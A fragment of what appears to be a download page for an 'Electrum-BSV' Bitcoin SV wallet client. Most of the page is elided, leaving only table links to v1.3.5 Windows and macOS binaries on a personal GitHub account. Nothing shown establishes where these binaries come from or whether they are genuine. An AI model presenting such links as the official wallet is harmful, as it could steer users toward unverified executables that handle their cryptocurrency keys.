...
# Electrum-BSV - Bitcoin SV Client
    ...
    <tbody>
      <tr>
        ...
        <td style="padding: 12px; text-align: center;">
          <a href="https://github.com/getoxxxyn/Electrum-BSV/releases/download/v1.3.5/electrum-bsv-1.3.5.exe" style="text-decoration: none;">
      ...
      <tr style="background: #f9f9f9;">
        ...
        <td style="padding: 12px; text-align: center;">
          <a href="https://github.com/getoxxxyn/Electrum-BSV/releases/download/v1.3.5/electrum-bsv-1.3.5.dmg" style="text-decoration: none;">
